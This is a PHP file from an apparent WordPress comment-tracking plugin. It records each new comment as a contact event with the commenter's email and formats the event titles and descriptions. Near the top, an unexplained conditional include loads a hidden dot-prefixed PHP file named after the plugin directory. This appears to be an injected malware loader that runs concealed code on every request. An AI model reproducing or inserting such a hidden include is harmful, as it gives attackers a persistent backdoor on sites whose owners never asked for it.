<?php

/*
 * Fire successful comment event
 */

add_action( 'wp_insert_comment', 'wtbp_wptao_event_contact_comment_fire', 99, 2 );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wtbp_wptao_event_contact_comment_fire( $comment_id, $comment_object ) {

	// filter WooCommerce
	if ( 'WooCommerce' == $comment_object->comment_agent ) {
		return;
	}

	$email = filter_var( $comment_object->comment_author_email, FILTER_VALIDATE_EMAIL );
	if ( !$email ) {
		return;
	}

	$user_data = array(
		'email'		 => $email,
		'options'	 => array(
			'allow_no_fingerptint'	 => false,
			'only_not_identified'	 => true
		)
	);

	$args = array(
		'title'		 => __( 'Contact', 'wp-tao' ),
		'value'		 => $comment_id,
		'tags'		 => array( 'wp' ),
		'user_data'	 => $user_data
	);

	do_action( 'wptao_track_event', 'comment', $args );
}

// =============================================================================================
// Filters section
// =============================================================================================

/*
 * Creates a title of the comment event
 */

add_filter( 'wptao_event_comment_title', 'wtbp_wptao_event_comment_title', 1, 2 );

function wtbp_wptao_event_comment_title( $title, $event ) {

	if ( !empty( $event->value ) ) {

		if ( is_numeric( $event->value ) ) {

			$comment_id = (int) $event->value;

			$comment = get_comment( $comment_id );

			if ( isset( $comment ) && !empty( $comment ) ) {

				$post = get_post( $comment->comment_post_ID );

				$title = sprintf( __( 'New comment on <a href="%s">%s</a>', 'wp-tao' ), get_permalink( $comment->comment_post_ID ), $post->post_title );
			}
		}
	}

	return $title;
}

/*
 * Creates a description of the comment action
 */

add_filter( 'wptao_event_comment_description', 'wtbp_wptao_event_comment_desc', 1, 2 );

function wtbp_wptao_event_comment_desc( $description, $event ) {

	if ( is_numeric( $event->value ) ) {

		$comment_id = (int) $event->value;

		$comment = get_comment( $comment_id );

		if ( isset( $comment ) && !empty( $comment ) ) {
			$description = esc_attr( $comment->comment_content );
		}
	}

	return $description;
}
